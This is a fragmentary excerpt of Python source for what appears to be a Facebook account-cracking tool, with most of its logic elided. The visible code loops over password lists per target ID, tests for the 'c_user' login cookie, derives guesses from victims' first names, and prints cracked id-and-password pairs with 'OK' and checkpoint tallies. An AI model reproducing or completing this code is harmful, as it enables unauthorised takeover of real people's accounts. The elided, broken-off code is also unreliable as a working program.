        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ALSOLTAN:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m ☛ B A D ☚ '+ids+' % '+pas+'\033[1;31m')
...
def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;31m ☛ G o o D ☚ \033[1;32m\033[1;33m %s \033[1;34m\033[1;38m OK \033[1;37m\033[1;33m [\033[1;31m%s\033[1;39m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def m4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;32m ☛ G o o D ☚ \033[1;36m\033[1;37m %s \033[1;36m\033[1;37m OK \033[1;36m\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
